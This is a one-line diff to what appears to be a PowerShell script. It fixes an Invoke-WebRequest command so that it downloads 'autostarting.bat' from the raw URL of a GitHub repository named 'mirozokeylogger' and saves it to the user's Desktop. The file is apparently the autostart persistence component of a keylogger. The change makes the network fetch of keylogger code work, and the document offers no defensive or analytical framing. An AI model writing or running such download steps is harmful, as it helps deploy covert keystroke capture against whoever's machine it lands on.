@@ -1,1 +1,1 @@
-Invoke-WebRequest -URI "https://github.com/MirozoPL/mirozokeylogger/blob/main/autostarting.bat" -OutFile "C:\Users\$env:USERNAME\Desktop\autostarting.bat"
+Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/autostarting.bat" -OutFile "C:\Users\$env:USERNAME\Desktop\autostarting.bat"
